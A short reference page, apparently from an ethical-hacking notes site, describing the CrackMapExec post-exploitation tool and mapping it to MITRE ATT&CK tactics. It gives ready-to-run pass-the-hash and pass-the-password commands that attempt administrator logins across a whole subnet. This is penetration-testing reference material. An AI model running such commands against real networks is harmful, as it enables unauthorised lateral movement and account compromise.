---
title: CrackMapExec
categories: [Ethical Hacking Tools, Frameworks and Suites]
tags: [crackmapexec, ldap, winrm, smb, ssh, mssql, pth]
comments: true
---

## Overview

CrackMapExec (CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land", abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions. [^1]

Kali Linux comes with CME pre-installed. [^2]

| Tool Name | Version | MITRE ATT&CK Tactic | MITRE ATT&CK Technique |
| --------- | ------- | ------------------- | ---------------------- |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | V5.3.0 | [Credential Access](https://attack.mitre.org/tactics/TA0006/) <br> [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) <br> [Discovery](https://attack.mitre.org/tactics/TA0007/) <br> [Collection](https://attack.mitre.org/tactics/TA0009/) <br> [Command and Control](https://attack.mitre.org/tactics/TA0011/) <br> [Exfiltration](https://attack.mitre.org/tactics/TA0010/) <br> [Execution](https://attack.mitre.org/tactics/TA0002/) <br> [Persistence](https://attack.mitre.org/tactics/TA0003/) <br> [Defense Evasion](https://attack.mitre.org/tactics/TA0005/) <br> [Lateral Movement](https://attack.mitre.org/tactics/TA0008/) |

## CrackMapExec Modules

### Lateral Movement

#### Pass The Hash/Password

After obtaining credential hashes, both the full hash or just the nt hash (second half) can be used to move laterally using Pass the Hash techniques. The following checks will attempt authentication to the entire /24 subnet though a single target may also be used.

```bash
# Pass the Hash
cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'

# Pass the Password
cme 192.168.1.0/24 -u Administrator -d Domain -p Password
```

## Sources

[^1]: [CrackMapExec Wiki](https://wiki.porchetta.industries/)
[^2]: [Kali Linux - CrackMapExec](https://www.kali.org/tools/crackmapexec/)
